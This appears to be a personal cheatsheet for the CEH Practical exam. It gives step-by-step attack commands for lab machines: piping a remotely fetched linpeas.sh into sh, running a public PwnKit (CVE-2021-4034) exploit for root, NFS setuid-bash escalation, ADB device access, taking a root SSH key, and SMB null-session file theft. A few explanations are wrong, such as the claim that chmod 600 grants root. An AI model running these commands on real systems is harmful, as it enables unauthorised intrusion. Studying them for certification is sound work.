# CEH_PRACTICAL
This my cheatsheet that i used to study for CEH_PRACTICAL
Tools
1.	Nmap/Zenmap
2.	Wireshark
3.	Metasploit
4.	Hydra
5.	Cryptool / BCTextEncoder
6.	Veracrypt
7.	Burp suite
8.	Hydra
9.	Hashes.com/HashMyfiles/HashCalc
10.	Snow steganography/OpenStego/Covert TCP
11.	SQL Injection / nslookup/sqlmap/nikto
12.	Android Debugging Bridge (adb)
# PRACTICAL TIME
https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything%20You%20Need.md
https://github.com/CyberHackPr/CEH_PRACTICAL/pulls Click Here for Notes

Exam RoadMap
1,2,8,11,12,16,17,18,20,7 (10 marks)  10,19,4,5,15,14,13,6,3,9  

**Priviledge Escalation**
Use LinPeas
1.	login to the ubuntu machine using the credentials given
2.	go to google and type linpeas, go to the github depository and download linpeas.sh (found on the release page) or use the command given 
3.	go to download. Cd Downloads/ then ls to view contents
4.	chmod +x linpeas to be  executable then ls
5.	run the executable by using attacke-1:~/Downloads$ ./linpeas.sh
6.	The other one is you can use curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh, found on github as well
7.	search for CVE-2021-4034 on mozilla the Cd Downloads/
8.	git clone https://github.com/arthepsy/CVE-2021-4034.git
9.	cd CVE-2021-4034
10.	type command "make"
11.	then type "./exploit" boom we are root
12. Alternative2: you can copy the cve-2021-4034-poc.c from Downlods to /tmp then CD /tmp
13. to compile you can use gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
14. then ./cve-2021-4034-poc and press enter you should be root.

Priviledge Escalation 2
Exploiting misconfigured NFS (port 2049)
1.	nmap -sV —p 2049 IP/Subnet
2.	sudo apt-get install nfs-common
3.	nmap -sV —script=nfs-showmount <Target_IP>
4.	check available mounts: showmount -e <Target_IP> -> we will see /home directory
5.	mkdir /tmp/nfs
6.	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
7.	cd /tmp/nfs
8.	sudo cp /bin/bash .
9.	sudo chmod +s bash -> it will be highlighted in red
10.	ls -la
11.	sudo df -h
12.	sudo chmod +s bash
after them, In another terminal:
	1. Access to target using SSH
	2. ./bash -p and we're root!
	3. cd /home
	4. ls -la
	5. Find the flag: find / -name "*.txt" -ls 2> /dev/null



**ADB Android Hacking** 
Perform deep scan on the elf files and obtain the last 4 digits of SHA 384 hash of the file with highest entropy value locate into android folder
1.	Scan adb port: nmap ip -sV -p 5555
2.	Connect adb: adb connect IP:5555
3.	Access mobile device: adb shell
4.	Elevate privilege using: sudo -i (if it is possile)
5.	pwd --> ls --> cd sdcard/Notifications/Scan --> ls --> cat secret.txt (If you can't find, check in others folders)
6.	Download files: adb pull /sdcard/Notifications/Scan Do it in another shell, without adb connection!
7.	We've three elf files, now we need to calculate entropy for each of them using this command: ent file.elf
8.	After selecting file.elf with highest entropy, we need to calculate hash of SHA 384: sha384sum file.elf and consider only the last 4 digits of the hash result.

Vertical Privilege escalation 
1. ssh smith@Ip –p 1337
2. sudo -L to check on users
3. cd /root then ls to see the .txt file, try to cat the file but permission is denied
4. then find the .ssh file 
5. then you cat id_rsa file key. Copy the key from beginning to end then nano id_rsa and paste the key
6. chmod 600 id_rsa  this give it root privileges 
7. as you are logged ,ssh root@ipaddrr –p 1336 –I id_rsa then you will have performed a vertical privilege escalation 

SMB Connection
1. smbclient -L <TARGET_IP> -N
2. smbclient -L <TARGET_IP> -U <USER>
3. smbclient //<TARGET_IP>/<USER> -U <USER>
4. smbclient //<TARGET_IP>/admin -U admin
5. smbclient //<TARGET_IP>/public -N #NULL Session
## SMBCLIENT
1. smbclient //<TARGET_IP>/share_name
2. help
3. ls
4. get <filename>

smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
